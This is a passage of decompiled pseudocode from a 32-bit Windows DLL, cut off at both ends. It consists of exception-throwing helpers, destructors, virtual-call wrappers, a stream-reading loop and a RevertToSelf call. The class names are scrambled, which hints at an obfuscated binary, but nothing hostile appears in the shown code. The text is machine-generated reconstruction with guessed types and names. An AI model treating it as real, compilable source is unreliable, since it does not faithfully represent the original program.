    return result;
  }
  *(_BYTE *)(this + 44) = 1;
  result = GetLastError();
  if ( result != 18 )
  {
    sub_1000E2E3(v5, 1);
    _CxxThrowException(v5, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 1002EE26: using guessed type _DWORD var_10[3];

//----- (1002EEA6) --------------------------------------------------------
int __thiscall sub_1002EEA6(int this)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  if ( *(_BYTE *)(this + 44) )
  {
    ((void (__thiscall *)(int *))sub_1000DEEF)(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return *(_DWORD *)(this + 24);
}
// 1000DEEF: using guessed type int __thiscall sub_1000DEEF(_DWORD, _DWORD);

//----- (1002EECB) --------------------------------------------------------
_DWORD *__stdcall sub_1002EECB(int pExceptionObject, _DWORD *a2, int a3)
{
  if ( *(_BYTE *)(pExceptionObject + 44) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_1000F530(*(_DWORD *)(pExceptionObject + 24), a2, a3);
  return a2;
}

//----- (1002EF20) --------------------------------------------------------
void __noreturn sub_1002EF20()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_1000E2E3(pExceptionObject, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
}
// 1002EF20: using guessed type void __noreturn sub_1002EF20();
// 1002EF20: using guessed type _DWORD pExceptionObject[3];

//----- (1002EF3F) --------------------------------------------------------
_DWORD *__thiscall sub_1002EF3F(_DWORD *Block, char a2)
{
  sub_1002EF5E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002EF5E) --------------------------------------------------------
BOOL __thiscall sub_1002EF5E(_DWORD *this)
{
  BOOL result; // eax
  char pExceptionObject[24]; // [esp+10h] [ebp-1Ch] BYREF
  int v3; // [esp+28h] [ebp-4h]

  *this = off_10074B94;
  v3 = 0;
  result = RevertToSelf();
  if ( !result )
  {
    sub_1000E2E3(1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 1000E2E3: using guessed type _DWORD __stdcall sub_1000E2E3(_DWORD);
// 10074B94: using guessed type int (__thiscall *off_10074B94[2])(void *Block, char);
// 1002EF5E: using guessed type char pExceptionObject[24];

//----- (1002EFAA) --------------------------------------------------------
int __userpurge sub_1002EFAA@<eax>(int a1@<edi>, int a2, char a3, char a4, char a5)
{
  *(_DWORD *)(a2 + 8) = 0;
  *(_BYTE *)(a2 + 4) = a3;
  *(_BYTE *)(a2 + 5) = a4;
  *(_BYTE *)(a2 + 6) = a5;
  *(_DWORD *)a2 = &off_10074B98;
  *(_BYTE *)(a2 + 7) = 0;
  sub_100114E7(a1, (_DWORD *)(a2 + 12));
  sub_10029D8C(a2 + 24);
  sub_1002F0BE(a2);
  return a2;
}
// 10074B98: using guessed type int (__thiscall *off_10074B98)(void *Block, char);

//----- (1002F007) --------------------------------------------------------
int *__thiscall sub_1002F007(int *Block, char a2)
{
  sub_1002F026(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002F026) --------------------------------------------------------
void __thiscall sub_1002F026(int *this)
{
  *this = (int)&off_10074B98;
  sub_10029DE8((int)(this + 6));
  sub_10009696(this + 3);
}
// 10074B98: using guessed type int (__thiscall *off_10074B98)(void *Block, char);

//----- (1002F065) --------------------------------------------------------
int __userpurge sub_1002F065@<eax>(int a1@<esi>, int a2)
{
  _DWORD pExceptionObject[4]; // [esp+14h] [ebp-10h] BYREF

  pExceptionObject[3] = 0;
  if ( *(_BYTE *)(a1 + 7) )
  {
    sub_1000E15A(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  sub_10029EF7(a2, a1 + 24);
  sub_1002F0BE(a1);
  return a2;
}
// 10029EF7: using guessed type _DWORD __stdcall sub_10029EF7(_DWORD, _DWORD);

//----- (1002F0BE) --------------------------------------------------------
void __stdcall sub_1002F0BE(int a1)
{
  _DWORD *v1; // eax
  DWORD v2; // eax
  bool v3; // zf
  char v4[47]; // [esp+10h] [ebp-40h] BYREF
  char v5; // [esp+3Fh] [ebp-11h]
  int v6; // [esp+4Ch] [ebp-4h]

  v5 = 0;
  while ( !v5 )
  {
    v6 = 0;
    v1 = (_DWORD *)sub_10029CE8(*(_DWORD *)(a1 + 8), a1 + 12, (int)v4, 0);
    LOBYTE(v6) = 1;
    sub_10029F50(a1 + 24, v1);
    LOBYTE(v6) = 0;
    sub_10029DE8((int)v4);
    v2 = sub_10029FA4(a1 + 24);
    switch ( v2 )
    {
      case 0x1000u:
        v3 = *(_BYTE *)(a1 + 4) == 0;
        break;
      case 0x2000u:
        v3 = *(_BYTE *)(a1 + 5) == 0;
        break;
      case 0x10000u:
        v3 = *(_BYTE *)(a1 + 6) == 0;
        break;
      default:
        goto LABEL_11;
    }
    if ( !v3 )
      v5 = 1;
LABEL_11:
    *(_DWORD *)(a1 + 8) += *(_DWORD *)(a1 + 60);
    v6 = -1;
  }
}

//----- (1002F15C) --------------------------------------------------------
_DWORD *__stdcall sub_1002F15C(_DWORD *a1, int a2, int a3, int a4)
{
  *a1 = &off_10074310;
  sub_10009F32(a1 + 1, (int)&a3);
  a1[3] = a2;
  sub_10009F65(&a3);
  return a1;
}
// 10074310: using guessed type int (__thiscall *off_10074310)(void *Block, char);

//----- (1002F1A2) --------------------------------------------------------
_DWORD *__stdcall sub_1002F1A2(_DWORD *a1, int a2)
{
  *a1 = &off_10074310;
  sub_10009D2C(a1 + 1, &word_1008E2E4);
  a1[3] = a2;
  return a1;
}
// 10074310: using guessed type int (__thiscall *off_10074310)(void *Block, char);

//----- (1002F1DD) --------------------------------------------------------
_DWORD *__stdcall sub_1002F1DD(int a1, _DWORD *a2)
{
  sub_10009F32(a2, a1 + 4);
  return a2;
}

//----- (1002F212) --------------------------------------------------------
void __thiscall sub_1002F212(int *this, int a2, int a3)
{
  sub_100021B1(&a3, this + 2);
  sub_10009F65(&a2);
}

//----- (1002F259) --------------------------------------------------------
_DWORD *__stdcall sub_1002F259(_DWORD *a1, int a2, volatile LONG *lpAddend, int a4, int a5)
{
  volatile LONG *v5; // eax
  int v6; // ecx
  _DWORD *v7; // eax
  int v9[2]; // [esp+10h] [ebp-18h] BYREF
  int v10; // [esp+18h] [ebp-10h]
  int v11; // [esp+24h] [ebp-4h]

  v10 = 0;
  v11 = 1;
  sub_1000C9E0((int)a1);
  v5 = lpAddend;
  v6 = a2;
  *a1 = &off_10074BA0;
  a1[4] = v5;
  a1[3] = v6;
  InterlockedIncrement(v5);
  sub_10009F32(a1 + 5, (int)&a4);
  LOBYTE(v11) = 4;
  if ( sub_1000A1C0((int)&unk_100955D0, (int)&a4) )
  {
    v7 = sub_1000A132(v9, (int)&a4, (int)&unk_100955C8);
    LOBYTE(v11) = 5;
    v10 = 1;
  }
  else
  {
    v7 = &unk_100955D0;
  }
  sub_10009F32(a1 + 7, (int)v7);
  v11 = 7;
  if ( (v10 & 1) != 0 )
  {
    v10 &= ~1u;
    sub_10009F65(v9);
  }
  LOBYTE(v11) = 0;
  sub_10002922(&a2);
  v11 = -1;
  sub_10009F65(&a4);
  return a1;
}
// 10074BA0: using guessed type int (__thiscall *off_10074BA0)(void *Block, char);

//----- (1002F321) --------------------------------------------------------
int *__thiscall sub_1002F321(int *Block, char a2)
{
  sub_1002F341(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002F341) --------------------------------------------------------
void __stdcall sub_1002F341(int *a1)
{
  sub_10009F65(a1 + 7);
  sub_10009F65(a1 + 5);
  sub_10002922(a1 + 3);
  sub_100219E0(a1);
}

//----- (1002F38A) --------------------------------------------------------
_DWORD *__fastcall sub_1002F38A(int a1, int a2, _DWORD *a3)
{
  _DWORD *v3; // eax
  int v5[2]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) )
  {
    v3 = sub_1000A132(v5, a2 + 28, a1);
    v7 = 1;
    v6 = 1;
  }
  else
  {
    v3 = (_DWORD *)(a2 + 20);
  }
  sub_10009F32(a3, (int)v3);
  v6 |= 2u;
  v7 = 0;
  if ( (v6 & 1) != 0 )
  {
    v6 &= ~1u;
    sub_10009F65(v5);
  }
  return a3;
}

//----- (1002F3F0) --------------------------------------------------------
void __thiscall sub_1002F3F0(_DWORD *this, int a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  v3 = this[3];
  v4 = sub_1002F38A(a2, (int)this, v5);
  v6 = 0;
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v3 + 20))(v3, v4, a3);
  v6 = -1;
  sub_10009F65(v5);
}
// 1002F3F0: using guessed type int var_14[4];

//----- (1002F430) --------------------------------------------------------
void __thiscall sub_1002F430(_DWORD *this, int a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  v3 = this[3];
  v4 = sub_1002F38A(a2, (int)this, v5);
  v6 = 0;
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v3 + 24))(v3, v4, a3);
  v6 = -1;
  sub_10009F65(v5);
}
// 1002F430: using guessed type int var_14[4];

//----- (1002F470) --------------------------------------------------------
void __thiscall sub_1002F470(_DWORD *this, int a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  v3 = this[3];
  v4 = sub_1002F38A(a2, (int)this, v5);
  v6 = 0;
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v3 + 28))(v3, v4, a3);
  v6 = -1;
  sub_10009F65(v5);
}
// 1002F470: using guessed type int var_14[4];

//----- (1002F4B0) --------------------------------------------------------
void __thiscall sub_1002F4B0(_DWORD *this, int a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  v3 = this[3];
  v4 = sub_1002F38A(a2, (int)this, v5);
  v6 = 0;
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v3 + 32))(v3, v4, a3);
  v6 = -1;
  sub_10009F65(v5);
}
// 1002F4B0: using guessed type int var_14[4];

//----- (1002F4F0) --------------------------------------------------------
void __thiscall sub_1002F4F0(_DWORD *this, int a2, int a3, int a4)
{
  int *v5; // esi
  _DWORD *v6; // eax
  int v7; // edx
  _DWORD v8[6]; // [esp+0h] [ebp-30h] BYREF
  int v9[5]; // [esp+18h] [ebp-18h] BYREF
  int v10; // [esp+2Ch] [ebp-4h]

  v10 = 0;
  v5 = (int *)this[3];
  v9[2] = (int)v8;
  sub_10009F32(v8, (int)&a3);
  LOBYTE(v10) = 1;
  v6 = sub_1002F38A(a2, (int)this, v9);
  LOBYTE(v10) = 2;
  v7 = *v5;
  LOBYTE(v10) = 3;
  (*(void (__thiscall **)(int *, _DWORD *))(v7 + 36))(v5, v6);
  LOBYTE(v10) = 0;
  sub_10009F65(v9);
  v10 = -1;
  sub_10009F65(&a3);
}

//----- (1002F558) --------------------------------------------------------
void __thiscall sub_1002F558(_DWORD *this, int a2, double a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v5[4]; // [esp+18h] [ebp-14h] BYREF
  int v6; // [esp+28h] [ebp-4h]

  v3 = this[3];
  v4 = sub_1002F38A(a2, (int)this, v5);
  v6 = 0;
  (*(void (__thiscall **)(int, _DWORD *, _DWORD, _DWORD))(*(_DWORD *)v3 + 40))(v3, v4, LODWORD(a3), HIDWORD(a3));
  v6 = -1;
  sub_10009F65(v5);
}
// 1002F558: using guessed type int var_14[4];

//----- (1002F59D) --------------------------------------------------------
LONG __thiscall sub_1002F59D(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8)
{
  int *v9; // esi
  _DWORD *v10; // eax
  int v11; // edx
  _DWORD v13[5]; // [esp-18h] [ebp-3Ch] BYREF
  _DWORD *v14; // [esp-4h] [ebp-28h]
  int v15[4]; // [esp+10h] [ebp-14h] BYREF
  int v16; // [esp+20h] [ebp-4h]

  v16 = 0;
  v14 = a8;
  v9 = (int *)this[3];
  a8 = v13;
  sub_1000C3F3(&a3, (int)v13);
  LOBYTE(v16) = 1;
  v10 = sub_1002F38A(a2, (int)this, v15);
  LOBYTE(v16) = 2;
  v11 = *v9;
  LOBYTE(v16) = 3;
  (*(void (__thiscall **)(int *, _DWORD *, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD *))(v11 + 44))(
    v9,
    v10,
    v13[0],
    v13[1],
    v13[2],
    v13[3],
    v13[4],
    v14);
  LOBYTE(v16) = 0;
  sub_10009F65(v15);
  v16 = -1;
  return sub_1000C45D(&a3);
}
// 1002F59D: using guessed type int var_14[4];

//----- (1002F607) --------------------------------------------------------
LONG __thiscall sub_1002F607(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int *v8; // esi
  _DWORD *v9; // eax
  int v10; // edx
  _BYTE v12[36]; // [esp+0h] [ebp-3Ch] BYREF
  int v13[5]; // [esp+24h] [ebp-18h] BYREF
  int v14; // [esp+38h] [ebp-4h]

  v14 = 0;
  v8 = (int *)this[3];
  v13[2] = (int)v12;
  sub_1000C3F3(&a3, (int)v12);
  LOBYTE(v14) = 1;
  v9 = sub_1002F38A(a2, (int)this, v13);
  LOBYTE(v14) = 2;
  v10 = *v8;
  LOBYTE(v14) = 3;
  (*(void (__thiscall **)(int *, _DWORD *))(v10 + 48))(v8, v9);
  LOBYTE(v14) = 0;
  sub_10009F65(v13);
  v14 = -1;
  return sub_1000C45D(&a3);
}

//----- (1002F66E) --------------------------------------------------------
char __thiscall sub_1002F66E(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  char v4; // bl
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_1002F38A(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 52))(v2, v3);
  v7 = -1;
  sub_10009F65(v6);
  return v4;
}
// 1002F66E: using guessed type int var_14[4];

//----- (1002F6AF) --------------------------------------------------------
char __thiscall sub_1002F6AF(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  char v4; // bl
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_1002F38A(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 56))(v2, v3);
  v7 = -1;
  sub_10009F65(v6);
  return v4;
}
// 1002F6AF: using guessed type int var_14[4];

//----- (1002F6F0) --------------------------------------------------------
__int16 __thiscall sub_1002F6F0(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_1002F38A(a2, (int)this, v5);
  v6 = 0;
  LOWORD(v2) = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 60))(v2, v3);
  v6 = -1;
  sub_10009F65(v5);
  return v2;
}
// 1002F6F0: using guessed type int var_14[4];

//----- (1002F733) --------------------------------------------------------
int __thiscall sub_1002F733(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v4; // esi
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_1002F38A(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 64))(v2, v3);
  v7 = -1;
  sub_10009F65(v6);
  return v4;
}
// 1002F733: using guessed type int var_14[4];

//----- (1002F774) --------------------------------------------------------
int __thiscall sub_1002F774(_DWORD *this, int a2, int a3, int a4)
{
  int v4; // esi
  _DWORD *v5; // eax
  int v7[2]; // [esp+10h] [ebp-18h] BYREF
  int v8; // [esp+18h] [ebp-10h]
  int v9; // [esp+24h] [ebp-4h]

  v8 = 0;
  v4 = this[3];
  v5 = sub_1002F38A(a3, (int)this, v7);
  v9 = 1;
  (*(void (__thiscall **)(int, int, _DWORD *, int))(*(_DWORD *)v4 + 68))(v4, a2, v5, a4);
  v8 = 1;
  LOBYTE(v9) = 0;
  sub_10009F65(v7);
  return a2;
}

//----- (1002F7C3) --------------------------------------------------------
int __thiscall sub_1002F7C3(_DWORD *this, int a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[2]; // [esp+10h] [ebp-18h] BYREF
  int v7; // [esp+18h] [ebp-10h]
  int v8; // [esp+24h] [ebp-4h]

  v7 = 0;
  v3 = this[3];
  v4 = sub_1002F38A(a3, (int)this, v6);
  v8 = 1;
  (*(void (__thiscall **)(int, int, _DWORD *))(*(_DWORD *)v3 + 72))(v3, a2, v4);
  v7 = 1;
  LOBYTE(v8) = 0;
  sub_10009F65(v6);
  return a2;
}

//----- (1002F80F) --------------------------------------------------------
void *__thiscall sub_1002F80F(_DWORD *this, void *a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[2]; // [esp+10h] [ebp-18h] BYREF
  int v7; // [esp+18h] [ebp-10h]
  int v8; // [esp+24h] [ebp-4h]

  v7 = 0;
  v3 = this[3];
  v4 = sub_1002F38A(a3, (int)this, v6);
  v8 = 1;
  (*(void (__thiscall **)(int, void *, _DWORD *))(*(_DWORD *)v3 + 76))(v3, a2, v4);
  v7 = 1;
  LOBYTE(v8) = 0;
  sub_10009F65(v6);
  return a2;
}

//----- (1002F85B) --------------------------------------------------------
void __thiscall sub_1002F85B(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v4[4]; // [esp+18h] [ebp-14h] BYREF
  int v5; // [esp+28h] [ebp-4h]

  v2 = this[3];
  v3 = sub_1002F38A(a2, (int)this, v4);
  v5 = 0;
  (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 80))(v2, v3);
  v5 = -1;
  sub_10009F65(v4);
}
// 1002F85B: using guessed type int var_14[4];

//----- (1002F89E) --------------------------------------------------------
int __thiscall sub_1002F89E(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v4; // esi
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_1002F38A(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 84))(v2, v3);
  v7 = -1;
  sub_10009F65(v6);
  return v4;
}
// 1002F89E: using guessed type int var_14[4];

//----- (1002F8DF) --------------------------------------------------------
char __thiscall sub_1002F8DF(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  char v4; // bl
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_1002F38A(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 88))(v2, v3);
  v7 = -1;
  sub_10009F65(v6);
  return v4;
}
// 1002F8DF: using guessed type int var_14[4];

//----- (1002F920) --------------------------------------------------------
void __thiscall sub_1002F920(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_1002F38A(a2, (int)this, v4);
  v5 = 0;
  (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 92))(v2, v3);
  v5 = -1;
  sub_10009F65(v4);
}
// 1002F920: using guessed type int var_14[4];

//----- (1002F95D) --------------------------------------------------------
_DWORD *__thiscall sub_1002F95D(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // ebx
  _DWORD *v5; // eax
  unsigned int i; // ebx
  int v7; // eax
  _DWORD *v8; // edi
  int v9; // ecx
  int v11[2]; // [esp+10h] [ebp-20h] BYREF
  int v12[2]; // [esp+18h] [ebp-18h] BYREF
  int v13; // [esp+20h] [ebp-10h]
  int v14; // [esp+2Ch] [ebp-4h]
  unsigned int v15; // [esp+3Ch] [ebp+Ch]

  v14 = 0;
  v13 = 0;
  v4 = this[3];
  v5 = sub_1002F38A(a3, (int)this, v12);
  v14 = 1;
  (*(void (__thiscall **)(int, _DWORD *, _DWORD *))(*(_DWORD *)v4 + 96))(v4, a2, v5);
  v13 = 1;
  LOBYTE(v14) = 0;
  sub_10009F65(v12);
  v15 = 0;
  for ( i = *(_DWORD *)(this[8] + 28); v15 < a2[1]; ++v15 )
  {
    v7 = (*(int (__thiscall **)(_DWORD *, unsigned int))(*a2 + 44))(a2, v15);
    sub_1000BA21(v12, v7);
    v14 = 2;
    v8 = sub_1000A3E9((int)v12, i, v11, 0xFFFFFFFE);
    LOBYTE(v14) = 3;
    v9 = (*(int (__thiscall **)(_DWORD *, unsigned int))(*a2 + 44))(a2, v15);
    sub_100021B1(v8 + 1, (int *)(v9 + 4));
    LOBYTE(v14) = 2;
    sub_10009F65(v11);
    LOBYTE(v14) = 0;
    sub_1000BA51(v12);
  }
  return a2;
}

//----- (1002FA2D) --------------------------------------------------------
int __thiscall sub_1002FA2D(int **this)
{
  return sub_10012B54(this[3]);
}

//----- (1002FA38) --------------------------------------------------------
int __thiscall sub_1002FA38(int *this)
{
  return sub_10012B30(this[3]);
}

//----- (1002FA43) --------------------------------------------------------
_DWORD *__stdcall sub_1002FA43(_DWORD *a1, int a2)
{
  __int32 v2; // eax

  v2 = sub_1001B5F6((int)a1, a2, 0);
  *a1 = &off_10074C04;
  sub_1002CEA0(v2, (int)(a1 + 4));
  return a1;
}
// 10074C04: using guessed type int (__thiscall *off_10074C04)(void *Block, char);

//----- (1002FA7D) --------------------------------------------------------
_BYTE *__thiscall sub_1002FA7D(_BYTE *Block, char a2)
{
  sub_1002FA9C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002FA9C) --------------------------------------------------------
int __thiscall sub_1002FA9C(_BYTE *this)
{
  *(_DWORD *)this = &off_10074C04;
  sub_1001B690(this);
  return sub_1001B64E(this);
}
// 10074C04: using guessed type int (__thiscall *off_10074C04)(void *Block, char);

//----- (1002FADE) --------------------------------------------------------
int __thiscall sub_1002FADE(void *this, int a2)
{
  int v3; // eax

  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3 + 16))(v3, a2);
  return sub_1002CF03((int)this + 16, a2);
}

//----- (1002FB03) --------------------------------------------------------
int __thiscall sub_1002FB03(void *this, _DWORD *a2)
{
  int v3; // eax

  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v3 + 12))(v3, a2);
  return sub_1002CEBB(a2, (int)this + 16);
}

//----- (1002FB28) --------------------------------------------------------
int __thiscall sub_1002FB28(_DWORD *this)
{
  return this[6];
}

//----- (1002FB2C) --------------------------------------------------------
char sub_1002FB2C()
{
  return 0;
}

//----- (1002FB2F) --------------------------------------------------------
_DWORD *__stdcall sub_1002FB2F(_DWORD *a1, int a2)
{
  __int32 v2; // eax

  v2 = sub_10025A41((int)a1, a2, 0);
  *a1 = &off_10074C38;
  sub_1002CEA0(v2, (int)(a1 + 4));
  return a1;
}
// 10074C38: using guessed type int (__thiscall *off_10074C38)(void *Block, char);

//----- (1002FB69) --------------------------------------------------------
_BYTE *__thiscall sub_1002FB69(_BYTE *Block, char a2)
{
  sub_1002FB88(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002FB88) --------------------------------------------------------
void __thiscall sub_1002FB88(_BYTE *this)
{
  *(_DWORD *)this = &off_10074C38;
  sub_10025AE7(this);
  sub_10025A99(this);
}
// 10074C38: using guessed type int (__thiscall *off_10074C38)(void *Block, char);

//----- (1002FBCA) --------------------------------------------------------
int __thiscall sub_1002FBCA(void *this, char *a2)
{
  int v3; // eax
  int v4; // ebx

  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  v4 = (*(int (__thiscall **)(int, char *))(*(_DWORD *)v3 + 16))(v3, a2);
  if ( v4 == 1 )
    sub_1002CF03((int)this + 16, *a2);
  return v4;
}

//----- (1002FBFC) --------------------------------------------------------
int __thiscall sub_1002FBFC(void *this, int *a2)
{
  int v3; // eax
  int v4; // ebx
  _DWORD *v5; // eax
  int v7[7]; // [esp+10h] [ebp-20h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]

  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  v4 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)v3 + 12))(v3, a2);
  if ( v4 )
  {
    v5 = (_DWORD *)sub_1000C73C(v4, a2, (int)v7, 0);
    v8 = 0;
    sub_1002CEBB(v5, (int)this + 16);
    v8 = -1;
    sub_1000C45D(v7);
  }
  return v4;
}
// 1002FBFC: using guessed type int var_20[7];

//----- (1002FC4F) --------------------------------------------------------
int __thiscall sub_1002FC4F(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 24))(v1);
}

//----- (1002FC5B) --------------------------------------------------------
int __thiscall sub_1002FC5B(_DWORD *this)
{
  return this[6];
}

//----- (1002FC5F) --------------------------------------------------------
char sub_1002FC5F()
{
  return 0;
}

//----- (1002FC62) --------------------------------------------------------
_DWORD *__stdcall sub_1002FC62(_DWORD *a1, int a2)
{
  sub_10025A41((int)a1, a2, 1);
  *a1 = &off_10074C70;
  return a1;
}
// 10074C70: using guessed type int (__thiscall *off_10074C70)(void *Block, char);

//----- (1002FC94) --------------------------------------------------------
_BYTE *__thiscall sub_1002FC94(_BYTE *Block, char a2)
{
  sub_1002FCB3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002FCB3) --------------------------------------------------------
void __thiscall sub_1002FCB3(_BYTE *this)
{
  *(_DWORD *)this = &off_10074C70;
  sub_10025AE7(this);
  sub_10025A99(this);
}
// 10074C70: using guessed type int (__thiscall *off_10074C70)(void *Block, char);

//----- (1002FCF5) --------------------------------------------------------
char __fastcall sub_1002FCF5(int a1)
{
  char v2; // [esp+1h] [ebp-1h] BYREF

  v2 = HIBYTE(a1);
  (*(void (__stdcall **)(char *, int))(*(_DWORD *)a1 + 84))(&v2, 1);
  return v2;
}

//----- (1002FD09) --------------------------------------------------------
bool __thiscall sub_1002FD09(void *this)
{
  unsigned __int8 v1; // al
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 52))(this);
  if ( v1 >= 2u )
  {
    sub_1000E01D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  return v1 == 1;
}
// 1002FD09: using guessed type _DWORD pExceptionObject[2];

//----- (1002FD3D) --------------------------------------------------------
__int16 __thiscall sub_1002FD3D(void *this)
{
  void *v2; // [esp+0h] [ebp-4h] BYREF

  v2 = this;
  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 84))(this, &v2, 2);
  return (__int16)v2;
}

//----- (1002FD52) --------------------------------------------------------
int __thiscall sub_1002FD52(void *this)
{
  void *v2; // [esp+0h] [ebp-4h] BYREF

  v2 = this;
  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 84))(this, &v2, 4);
  return (int)v2;
}

//----- (1002FD66) --------------------------------------------------------
double __thiscall sub_1002FD66(void *this)
{
  double v2; // [esp+0h] [ebp-8h] BYREF

  (*(void (__thiscall **)(void *, double *, int))(*(_DWORD *)this + 84))(this, &v2, 8);
  return v2;
}

//----- (1002FD7B) --------------------------------------------------------
int __thiscall sub_1002FD7B(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 84))(this, a2, 8);
  return a2;
}

//----- (1002FD8F) --------------------------------------------------------
int *__thiscall sub_1002FD8F(void *this, int *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  int v6[5]; // [esp+10h] [ebp-40h] BYREF
  int v7[3]; // [esp+24h] [ebp-2Ch] BYREF
  unsigned int v8; // [esp+30h] [ebp-20h]
  int v9[2]; // [esp+38h] [ebp-18h] BYREF
  int v10; // [esp+40h] [ebp-10h]
  int v11; // [esp+4Ch] [ebp-4h]

  v11 = 0;
  v10 = 0;
  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 80))(this, v7, 1);
  v11 = 1;
  sub_10009D2C(a2, &word_1008E2DC);
  v10 = 1;
